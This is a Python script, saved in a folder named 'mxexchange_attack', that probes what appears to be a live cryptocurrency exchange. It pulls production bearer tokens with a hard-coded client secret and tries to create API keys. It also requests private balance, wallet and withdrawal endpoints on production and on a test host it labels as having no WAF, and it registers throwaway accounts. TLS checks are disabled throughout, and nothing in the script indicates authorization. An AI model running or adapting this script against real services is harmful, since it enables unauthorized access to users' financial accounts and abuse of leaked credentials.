import requests, json, sys, urllib3, base64
urllib3.disable_warnings()
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
T = 20

def safe(t, n=600):
    return t[:n].encode('ascii','replace').decode('ascii') if t else ""

H = {"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0"}

# Get fresh PROD token (24h)
r = requests.post("https://identity.mx.exchange/connect/token", data={
    "client_id": "spa", "client_secret": "secret",
    "grant_type": "client_credentials",
    "scope": "accountApi walletApi orderBookApi brokerApi commonApi notificationApi"
}, headers=H, timeout=T, verify=False)
PROD_TOKEN = r.json()["access_token"]
print(f"[+] PROD token: {PROD_TOKEN[:50]}... (24h)")

AUTH = {"Authorization": f"Bearer {PROD_TOKEN}", "Accept": "application/json", 
        "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

results = {}

print("\n" + "=" * 70)

# 1. Try CreateOpenApiKey
print("\n[1] CREATE OPENAPI KEY...")
payloads = [
    {},
    {"label": "test"},
    {"name": "test-key"},
    {"description": "test"},
]
for p in payloads:
    r = requests.post("https://account.mx.exchange/api/Account/CreateOpenApiKey", 
                     json=p, headers=AUTH, timeout=T, verify=False)
    print(f"  POST CreateOpenApiKey {json.dumps(p)} => {r.status_code} ({len(r.text)}b) {safe(r.text,300)}")

# 2. PUBLIC MARKET DATA (no auth, proper versioning)
print("\n[2] PUBLIC MARKET DATA...")
OPENAPI = "https://openapi.mx.exchange"
market_eps = [
    "/api/1/ticker?pair=BTCMYR",
    "/api/1/ticker?pair=ETHMYR",
    "/api/1/ticker?pair=XRPMYR",
    "/api/1/ticker?pair=SOLMYR",
    "/api/1/ticker?pair=WLDMYR",
    "/api/1/ticker/all",
    "/api/1/orderbook?pair=BTCMYR",
    "/api/1/orderbook?pair=ETHMYR",
    "/api/1/trade?pair=BTCMYR&limit=5",
    "/api/1/marketpair",
    "/api/1/marketpair/active",
    "/api/1/currency",
    "/api/1/currency/active",
]

for path in market_eps:
    for h in [
        {"Accept": "application/json", "User-Agent": "Mozilla/5.0"},
        {"Accept": "application/json", "User-Agent": "Mozilla/5.0", "Origin": "https://app.mx.exchange",
         "Referer": "https://app.mx.exchange/"},
    ]:
        try:
            r = requests.get(f"{OPENAPI}{path}", headers=h, timeout=T, verify=False)
            if r.status_code == 200 and r.text and len(r.text) > 2:
                print(f"  [!!!] {path} => {r.status_code} ({len(r.text)}b)")
                print(f"    {safe(r.text, 300)}")
                results[path] = r.text[:5000]
                break
            elif r.status_code != 200:
                if h.get("Origin"):
                    print(f"  {path} => {r.status_code} (with Origin)")
        except Exception as e:
            print(f"  {path} => {e}")
            break

# 3. PUBLIC DATA via UAT (no Cloudflare)
print("\n[3] UAT MARKET DATA (no WAF)...")
UAT = "https://openapiuat.azurewebsites.net"
for path in market_eps:
    try:
        r = requests.get(f"{UAT}{path}", headers={"Accept":"application/json","User-Agent":"Mozilla/5.0"},
                        timeout=T, verify=False)
        if r.status_code == 200 and r.text and len(r.text) > 2:
            print(f"  [!!!] {path} => {r.status_code} ({len(r.text)}b)")
            print(f"    {safe(r.text, 300)}")
            results[f"uat_{path}"] = r.text[:5000]
    except:
        pass

# 4. Try using PROD token on OpenAPI private endpoints
print("\n[4] OPENAPI PRIVATE (with Bearer token)...")
private_eps = [
    "/api/1/user/balance",
    "/api/1/user/trades?pair=BTCMYR",
    "/api/1/user/order/openorders?pair=BTCMYR",
    "/api/1/user/deposit",
    "/api/1/user/withdrawal",
    "/api/1/user/wallet",
]
for path in private_eps:
    r = requests.get(f"{OPENAPI}{path}", headers={
        "Authorization": f"Bearer {PROD_TOKEN}",
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0"
    }, timeout=T, verify=False)
    if r.status_code != 404:
        print(f"  {path} => {r.status_code} ({len(r.text)}b) {safe(r.text,300)}")

# Also try UAT with token
for path in private_eps:
    hkdev_r = requests.post("https://identityhkdev.mx.exchange/connect/token", data={
        "client_id": "spa", "client_secret": "secret",
        "grant_type": "client_credentials"
    }, headers=H, timeout=T, verify=False)
    hkdev_tok = hkdev_r.json()["access_token"]
    
    r = requests.get(f"{UAT}{path}", headers={
        "Authorization": f"Bearer {hkdev_tok}",
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0"
    }, timeout=T, verify=False)
    if r.status_code != 404:
        print(f"  UAT {path} => {r.status_code} ({len(r.text)}b) {safe(r.text,200)}")
    break  # Only need one test

# 5. Re-register and check response headers
print("\n[5] RE-REGISTER (check headers)...")
import time
ts = int(time.time())
new_email = f"mxtest{ts}@gmail.com"
r = requests.post("https://accounthkdev.mx.exchange/api/Account/Register", json={
    "name": "Test Account",
    "email": new_email,
    "password": "TestPass2026!@#",
    "confirmPassword": "TestPass2026!@#",
    "country": 1,
    "accountType": 0,
}, headers={"Content-Type":"application/json","Accept":"application/json","User-Agent":"Mozilla/5.0"},
   timeout=T, verify=False)
print(f"  {new_email} => {r.status_code}")
print(f"  Headers: {dict(r.headers)}")
print(f"  Body: {safe(r.text, 500)}")
if r.status_code in (200, 201) and r.text:
    try:
        data = r.json()
        print(f"  JSON: {json.dumps(data, indent=2)[:500]}")
        results["register_response"] = data
    except:
        pass

# Save
with open(r"c:\xampp\htdocs\pentagi\mxexchange_attack\final_probe_results.json", "w") as f:
    json.dump(results, f, indent=2, ensure_ascii=True)
print(f"\n{'='*70}")
print(f"Results: {len(results)}")
